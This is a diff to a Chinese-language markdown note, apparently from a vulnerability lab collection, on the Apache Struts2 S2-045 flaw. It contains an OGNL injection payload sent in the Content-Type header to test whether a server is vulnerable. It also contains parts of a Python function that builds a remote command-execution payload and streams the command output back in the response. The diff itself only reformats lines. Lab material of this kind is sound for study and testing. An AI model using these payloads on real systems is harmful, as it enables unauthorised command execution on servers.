@@ -2,7 +2,8 @@
 
 ## 验证目标是否存在S2-045漏洞
 ```exp
-%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
+Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
+
 ```
 
 ## 命令执行
@@ -25,4 +26,5 @@ def p(cmd):
     payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
     payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
     payload += "(#ros.flush())}"
+
 ```
